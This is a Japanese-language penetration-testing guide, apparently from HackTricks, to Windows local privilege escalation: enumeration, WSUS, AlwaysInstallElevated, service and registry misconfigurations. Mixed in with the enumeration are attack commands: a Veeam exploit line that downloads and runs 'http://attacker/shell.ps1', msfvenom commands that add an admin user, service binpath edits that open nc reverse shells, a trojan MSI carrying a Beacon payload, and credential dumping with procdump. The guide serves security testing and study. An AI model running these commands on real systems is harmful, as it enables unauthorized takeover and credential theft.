# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows の local privilege escalation vectors を探す最適な tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

このページでは、複数の基礎的な guide に基づく、Windows の privilege-escalation methodology をまとめています。<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> 実践的な enumeration flow では、community の workshops と checklists も参考にしています。<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> 過去の attack に関する内容には、Windows privilege escalation に関する DerbyCon presentation も含まれています。<sup>[[5]](#references)</sup>

## Windows の初期理論

### Access Tokens

**Windows の access tokens が何か分からない場合は、先に以下のページを読んでください:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs の詳細については、以下のページを確認してください:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows における integrity levels が何か分からない場合は、先に以下のページを読んでください:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows には、**system の enumeration を妨げたり**、executables を実行したり、さらには**活動を検知したり**できるさまざまな要素があります。privilege escalation の enumeration を開始する前に、以下の**ページを読んで**、これらすべての**defenses** と **mechanisms** を **enumerate** してください:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess の silent elevation

`RAiLaunchAdminProcess` を通じて起動された UIAccess processes は、AppInfo の secure-path checks が bypass された場合、prompts なしで High IL に到達するために悪用できます。専用の UIAccess/Admin Protection bypass workflow は以下を確認してください:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation は、任意の SYSTEM registry write（RegPwn）に悪用できます:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

最近の Windows builds では、privileged local NTLM authentication が再利用された SMB TCP connection 上で reflected される、**SMB arbitrary-port** LPE path も導入されています:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info の enumeration

Windows version に既知の vulnerability があるか確認してください（適用済みの patches も確認してください）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### バージョンの Exploits

この [site](https://msrc.microsoft.com/update-guide/vulnerability) は、Microsoft の security vulnerabilities に関する詳細情報を検索するのに便利です。この database には 4,700 件を超える security vulnerabilities が登録されており、Windows environment が持つ**膨大な attack surface**を示しています。

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

env variables に credential/Juicy info が保存されていないか？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell履歴
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript ファイル

[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) で、これを有効にする方法を確認できます。
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell pipeline の実行に関する詳細が記録され、実行されたコマンド、コマンドの呼び出し、スクリプトの一部などが含まれます。ただし、実行の詳細や出力結果が完全には取得されない場合があります。

これを有効にするには、ドキュメントの「Transcript files」セクションの手順に従い、**「Powershell Transcription」**ではなく**「Module Logging」**を選択します。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShellのログから直近15件のイベントを表示するには、次を実行します。
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

スクリプトの実行に関する完全なアクティビティと全コンテンツの記録が取得され、実行時にコードのすべてのブロックが記録されます。このプロセスにより、各アクティビティの包括的な監査証跡が保持され、forensics や悪意のある動作の分析に役立ちます。実行時のすべてのアクティビティを記録することで、プロセスに関する詳細な情報が提供されます。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block のイベントログは、Windows Event Viewer の次のパスにあります: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**。\
最後の20件のイベントを表示するには、次を使用します:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### インターネット設定
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ドライブ
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

更新が http**S** ではなく http を使用して要求されている場合、システムを侵害できます。

まず、cmd で以下を実行し、ネットワークが非 SSL の WSUS update を使用しているか確認します。
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
または、PowerShellでは次のようにします。
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
以下のような返信を受け取った場合:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
そして、`HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` または `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` の値が `1` の場合です。

その場合、**exploit可能です。** 最後のレジストリ値が `0` の場合、WSUSエントリは無視されます。

この脆弱性をexploitするには、[Wsuxploit](https://github.com/pimps/wsuxploit) や [pyWSUS ](https://github.com/GoSecure/pywsus) などのtoolを使用できます。これらは、非SSLのWSUSトラフィックに'MiTM weaponized exploits scripts'を注入し、'fake' updatesを挿入するためのスクリプトです。

researchはこちらを参照してください：

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**完全なreportはこちら**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
基本的に、これはこのbugがexploitする欠陥です：

> ローカルuserのproxyを変更でき、Windows UpdatesがInternet Explorerの設定で構成されたproxyを使用している場合、[PyWSUS](https://github.com/GoSecure/pywsus)をローカルで実行して自身のトラフィックをinterceptし、asset上で昇格されたuserとしてcodeを実行できます。
>
> さらに、WSUS serviceはcurrent userの設定を使用するため、そのcertificate storeも使用します。WSUS hostname用のself-signed certificateを生成し、このcertificateをcurrent userのcertificate storeに追加すると、HTTPとHTTPSの両方のWSUSトラフィックをinterceptできます。WSUSは、certificateに対するtrust-on-first-use型のvalidationを実装するためのHSTSに似たmechanismを使用していません。提示されたcertificateがuserによってtrustedで、正しいhostnameを持っていれば、serviceによって受け入れられます。

このvulnerabilityは、[**WSUSpicious**](https://github.com/GoSecure/wsuspicious)（liberatedされた後）というtoolを使用してexploitできます。

## Third-Party Auto-Updaters and Agent IPC (local privesc)

多くのenterprise agentは、localhostのIPC surfaceとprivileged update channelを公開しています。enrollmentをattacker serverへ強制でき、updaterがrogue root CAまたはweak signer checksをtrustする場合、local userはmalicious MSIを配信し、SYSTEM serviceにinstallさせることができます。Netskope stAgentSvc chain（CVE-2025-0309）を基にしたgeneralized techniqueはこちらを参照してください：


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (TCP 9401経由のSYSTEM)

Veeam B&R < `11.0.1.1261` は、**TCP/9401**でlocalhost serviceを公開しており、attacker-controlled messagesを処理することで、**NT AUTHORITY\SYSTEM**として任意のcommandsを実行できます。<sup>[[12]](#references)</sup>

- **Recon**: listenerとversionを確認します。例：`netstat -ano | findstr 9401` および `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`。
- **Exploit**: 必要なVeeam DLLsとともに`VeeamHax.exe`などのPoCを同じdirectoryに配置し、local socket経由でSYSTEM payloadをtriggerします：
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
サービスはコマンドを SYSTEM として実行します。
## KrbRelayUp

特定の条件下において、Windows **domain** 環境には **local privilege escalation** の脆弱性が存在します。これらの条件には、**LDAP signing が強制されていない**環境、ユーザーが **Resource-Based Constrained Delegation (RBCD)** を設定できる self-rights を持っていること、およびユーザーが domain 内にコンピューターを作成できることが含まれます。重要なのは、これらの **requirements** が **default settings** で満たされることです。

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) で **exploit** を確認してください。

攻撃のフローについては、[https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup> を確認してください。

## AlwaysInstallElevated

これら 2 つのレジストリが **enabled**（値が **0x1**）の場合、あらゆる権限のユーザーが `*.msi` ファイルを NT AUTHORITY\\**SYSTEM** として **install**（実行）できます。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```
meterpreter セッションがある場合は、モジュール **`exploit/windows/local/always_install_elevated`** を使用してこの technique を自動化できます。

### PowerUP

power-up の `Write-UserAddMSI` コマンドを使用すると、現在のディレクトリ内に、privileges を escalate するための Windows MSI binary を作成できます。この script は、user/group の追加を促す precompiled MSI installer を書き出します（そのため、GIU access が必要です）。
```
Write-UserAddMSI
```
作成したバイナリを実行するだけで privileges をエスカレートできます。

### MSI Wrapper

このツールを使用して MSI wrapper を作成する方法については、このチュートリアルを参照してください。**command lines** を**実行**したいだけの場合は、"**.bat**" ファイルを wrap できることに注意してください。


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- Cobalt Strike または Metasploit を使用して、**新しい Windows EXE TCP payload** を `C:\privesc\beacon.exe` に**生成**します
- **Visual Studio** を開き、**Create a new project** を選択して、検索ボックスに "installer" と入力します。**Setup Wizard** プロジェクトを選択し、**Next** をクリックします。
- プロジェクト名（**AlwaysPrivesc** など）を指定し、場所に **`C:\privesc`** を使用して、**place solution and project in the same directory** を選択し、**Create** をクリックします。
- 手順 3/4（含めるファイルの選択）が表示されるまで **Next** をクリックし続けます。**Add** をクリックし、先ほど生成した Beacon payload を選択します。その後、**Finish** をクリックします。
- **Solution Explorer** で **AlwaysPrivesc** プロジェクトを選択し、**Properties** で **TargetPlatform** を **x86** から **x64** に変更します。
- **Author** や **Manufacturer** など、インストールされた app をより正規のものに見せるために変更できる他のプロパティもあります。
- プロジェクトを右クリックし、**View > Custom Actions** を選択します。
- **Install** を右クリックし、**Add Custom Action** を選択します。
- **Application Folder** をダブルクリックし、**beacon.exe** ファイルを選択して **OK** をクリックします。これにより、installer の実行直後に beacon payload が実行されます。
- **Custom Action Properties** で、**Run64Bit** を **True** に変更します。
- 最後に、**build** します。
- `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` という warning が表示された場合は、platform を x64 に設定していることを確認してください。

### MSI Installation

悪意のある `.msi` ファイルの**インストール**を**バックグラウンド**で実行するには：
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
この脆弱性を悪用するには、次を使用できます: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### 監査設定

これらの設定は何が**記録される**かを決定するため、注意を払う必要があります。
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwardingでは、ログの送信先を確認できます。
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** は、**ローカル Administrator パスワードの管理**を目的として設計されており、ドメインに参加しているコンピューター上で各パスワードが**一意で、ランダム化され、定期的に更新される**ことを保証します。これらのパスワードは Active Directory 内に安全に保存され、ACL を通じて十分な権限を付与されたユーザーのみがアクセスできます。これにより、許可されたユーザーはローカル管理者パスワードを確認できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

有効になっている場合、**平文パスワードは LSASS**（Local Security Authority Subsystem Service）**に保存されます**。\
[**このページの WDigest に関する詳細情報**](../stealing-credentials/credentials-protections.md#wdigest)。
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** 以降、Microsoft は Local Security Authority (LSA) に対する保護を強化し、信頼されていないプロセスによる **メモリの読み取り** やコードの挿入を **ブロック** して、システムのセキュリティをさらに強化しました。\
[**LSA Protection の詳細はこちら**](../stealing-credentials/credentials-protections.md#lsa-protection)。
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。その目的は、pass-the-hash 攻撃などの脅威から、デバイスに保存された credentials を保護することです。[**Credential Guard の詳細情報はこちらです。**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**ドメイン資格情報**は**Local Security Authority**（LSA）によって認証され、オペレーティングシステムのコンポーネントで利用されます。ユーザーのログオンデータが登録済みのセキュリティパッケージによって認証されると、通常、そのユーザーのドメイン資格情報が確立されます。\
[**Cached Credentials の詳細はこちら**](../stealing-credentials/credentials-protections.md#cached-credentials)。
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## ユーザーとグループ

### ユーザーとグループの列挙

所属しているグループに興味深い権限がないか確認します
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privileged groups

**特権グループに所属している場合、権限を昇格できる可能性があります**。特権グループと、それらを悪用して権限を昇格する方法については、こちらを参照してください:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

このページで**token**とは何かについて、**詳しく学べます**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens)。\
**興味深いtoken**と、それらを悪用する方法については、次のページを確認してください:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Logged users / Sessions
```bash
qwinsta
klist sessions
```
### ホームフォルダー
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### パスワードポリシー
```bash
net accounts
```
### クリップボードの内容を取得する
```bash
powershell -command "Get-Clipboard"
```
## 実行中のプロセス

### ファイルとフォルダーの権限

まず、プロセスを一覧表示する際は、**プロセスのコマンドライン内にパスワードがないか確認します**。\
**実行中のバイナリを上書きできるか**、または[**DLL Hijacking attacks**](dll-hijacking/index.html)を悪用できるよう、バイナリのフォルダーに対する書き込み権限があるかを確認します。
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
常に実行中の[**electron/cef/chromium debuggers**を確認してください。これを悪用して権限を昇格できる可能性があります](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md)。

**プロセスのバイナリに対する権限の確認**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**プロセスのバイナリが存在するフォルダの権限を確認（**[**DLL Hijacking**](dll-hijacking/index.html)**）**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### メモリからの Password mining

sysinternals の **procdump** を使用して、実行中のプロセスのメモリダンプを作成できます。FTP などのサービスは**メモリ上に credentials が clear text で保存されている**ため、メモリをダンプして credentials を読み取ってみてください。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Insecure GUI apps

**SYSTEMとして実行されているアプリケーションでは、ユーザーがCMDを起動したり、ディレクトリを参照したりできる場合があります。**

例: "Windows Help and Support" (Windows + F1) で、"command prompt" を検索し、"Click to open Command Prompt" をクリックします。

## Services

Service Triggers により、特定の条件（named pipe/RPC endpoint のアクティビティ、ETW events、IP availability、device arrival、GPO refresh など）が発生したときに、Windowsはサービスを開始できます。SERVICE_START rights がなくても、トリガーを発火させることで、privileged services を開始できる場合があります。enumeration と activation techniques については、こちらを参照してください。

-
{{#ref}}
service-triggers.md
{{#endref}}

サービスの一覧を取得します:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 権限

**sc** を使用してサービスの情報を取得できます
```bash
sc qc <service_name>
```
各サービスに必要な権限レベルを確認するため、_Sysinternals_ の **accesschk** バイナリを用意しておくことを推奨します。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
「Authenticated Users」が変更可能なサービスがないか確認することを推奨します：
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[XP用のaccesschk.exeはこちらからダウンロードできます](https://github.com/ankh2054/windows-pentest/raw/master/Privilege/accesschk-2003-xp.exe)

### serviceを有効化する

（例：SSDPSRVで）次のエラーが発生する場合：

_システム エラー 1058 が発生しました。_\
_サービスは無効になっているか、有効なデバイスが関連付けられていないため、開始できません。_

次の方法で有効化できます。
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**XP SP1では、upnphostサービスが動作するためにSSDPSRVに依存している点に注意してください**

この問題に対する**別の回避策**は、次を実行することです：
```
sc.exe config usosvc start= auto
```
### **サービスバイナリパスの変更**

「Authenticated users」グループがサービスに対する **SERVICE_ALL_ACCESS** を持っている場合、サービスの実行可能バイナリを変更できます。**sc** を変更して実行するには:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### サービスを再起動する
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
権限は、さまざまな権限を通じて昇格できます。

- **SERVICE_CHANGE_CONFIG**: service binary の再構成を許可します。
- **WRITE_DAC**: permission の再構成を可能にし、service configuration を変更できるようにします。
- **WRITE_OWNER**: ownership の取得と permission の再構成を許可します。
- **GENERIC_WRITE**: service configuration を変更する権限を継承します。
- **GENERIC_ALL**: service configuration を変更する権限も継承します。

この vulnerability の検出と exploitation には、_exploit/windows/local/service_permissions_ を利用できます。

### Services binaries weak permissions

service が **`LocalSystem`**、**`LocalService`**、**`NetworkService`**、または privileged domain account として実行されている一方で、**low-privileged users が service EXE またはその parent folder を変更できる場合**、通常は **binary を置き換えて service を再起動することで service を hijack できます**。

**service が実行する binary を変更できるか**、または binary が配置されている **folder に write permissions があるか**を確認します（[**DLL Hijacking**](dll-hijacking/index.html)**。**）\
**wmic**（system32 にはありません）を使用すると service が実行するすべての binary を取得でき、**icacls** で permissions を確認できます：
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
また、**sc** と **icacls** も使用できます。
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
**`Everyone`**、**`BUILTIN\Users`**、または **`Authenticated Users`** に付与された危険な ACL を探します。特に、サービス実行ファイルまたはそれを含むディレクトリに対する **`(F)`**、**`(M)`**、**`(W)`** に注意してください。実際の abuse flow は次のとおりです。<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` でサービスアカウントと実行ファイルのパスを確認します。
2. `icacls <path>` でバイナリが書き込み可能か確認します。
3. サービスバイナリを payload または有効な malicious service binary に置き換えます。
4. `sc stop <service_name> && sc start <service_name>` でサービスを再起動します（または再起動 / service trigger を待ちます）。

便利な自動チェック：<sup>[[28]](#references)</sup>
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> サービスが通常のユーザーによる再起動を許可していない場合は、起動時に自動的に開始されるか、再起動させる failure action が設定されているか、またはそのサービスを使用するアプリケーションによって間接的にトリガーできるかを確認してください。

### サービスレジストリの変更権限

サービスレジストリを変更できるか確認してください。\
次の方法で、サービス**レジストリ**に対する**権限**を**check**できます。
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が `FullControl` 権限を持っているか確認する必要があります。持っている場合、service によって実行される binary を変更できます。

実行される binary の Path を変更するには:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### 任意の HKLM value write につながる Registry symlink race（ATConfig）

一部の Windows Accessibility 機能は、ユーザーごとの **ATConfig** キーを作成します。このキーは後で **SYSTEM** プロセスによって HKLM の session key にコピーされます。Registry **symbolic link race** により、この特権 write を **任意の HKLM path** にリダイレクトでき、任意の HKLM **value write** primitive が得られます。<sup>[[18]](#references)</sup>

主な key locations（例：On-Screen Keyboard `osk`）：

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` には、インストール済みの accessibility features が一覧表示されます。
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` には、ユーザーが制御可能な configuration が保存されます。
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` は logon/secure-desktop transitions 中に作成され、ユーザーが write できます。

Abuse flow（CVE-2026-24291 / ATConfig）：

1. SYSTEM に write させたい **HKCU ATConfig** value を設定します。
2. secure-desktop copy を trigger します（例：**LockWorkstation**）。これにより AT broker flow が開始されます。
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` に **oplock** を設定して **race に勝ち**ます。oplock が発生したら、**HKLM Session ATConfig** key を、保護された HKLM target への **registry link** に置き換えます。
4. SYSTEM が、攻撃者が選択した value をリダイレクト先の HKLM path に write します。

任意の HKLM value write を取得したら、service configuration values を overwrite して LPE に pivot できます。

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath`（EXE/command line）
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll`（DLL）

通常のユーザーが start できる service（例：**`msiserver`**）を選択し、write 後に trigger します。**注記：** public exploit implementation は race の一部として workstation を **lock** します。

Example tooling（RegPwn BOF / standalone）：<sup>[[19]](#references)</sup>
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

レジストリに対してこの権限を持っている場合、**このレジストリからサブレジストリを作成できる**ことを意味します。Windows services の場合、これは**任意のコードを実行するのに十分です：**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

実行可能ファイルへのパスが引用符で囲まれていない場合、Windows はスペースまでの各候補を実行しようとします。

たとえば、パス _C:\Program Files\Some Folder\Service.exe_ に対して、Windows は次のファイルを実行しようとします：
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
組み込みの Windows サービスに属するものを除外して、引用符で囲まれていないすべてのサービスパスを一覧表示します:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
